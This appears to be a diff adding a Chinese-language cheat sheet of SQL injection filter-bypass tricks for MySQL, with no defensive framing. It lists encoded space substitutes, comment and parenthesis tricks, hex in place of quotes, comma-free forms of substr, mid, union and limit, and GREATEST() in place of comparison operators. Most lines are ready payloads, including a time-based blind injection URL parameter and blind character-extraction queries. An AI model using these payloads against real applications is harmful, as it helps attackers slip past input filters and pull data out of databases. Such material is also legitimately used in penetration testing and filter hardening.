@@ -1,0 +1,38 @@
+绕过空格
+两个空格代替一个空格，Tab代替空格，%a0=空格
+payload:%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /!/
+
+最基本的绕过方法，用注释替换空格： /* 注释 */
+
+括号绕过空格
+mysql语句：select(user())from dual where(1=1)and(2=2)
+
+这种过滤方法常常用于time based盲注,例如：
+?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23
+
+绕过引号
+where字句无法使用
+用16进制
+
+绕过逗号
+在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：
+select substr(database() from 1 for 1);
+select mid(database() from 1 for 1);
+使用join：
+union select 1,2#
+等价于 union select * from (select 1)a join (select 2)b
+使用like:
+select ascii(mid(user(),1,1))=80 #
+等价于 select user() like 'r%'
+对于limit可以使用offset来绕过：
+select * from news limit 0,1 #
+等价于下面这条SQL语句 select * from news limit 1 offset 0
+
+绕过比较符号()
+（过滤了<>：sqlmap盲注经常使用<>，使用between的脚本）：
+
+使用greatest()、least（）：（前者返回最大值，后者返回最小值）
+同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。 最常见的一个盲注的sql语句：
+select * from users where id=1 and ascii(substr(database(),0,1))>64
+此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。 那么上面的这条sql语句可以使用greatest变为如下的子句:
+select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
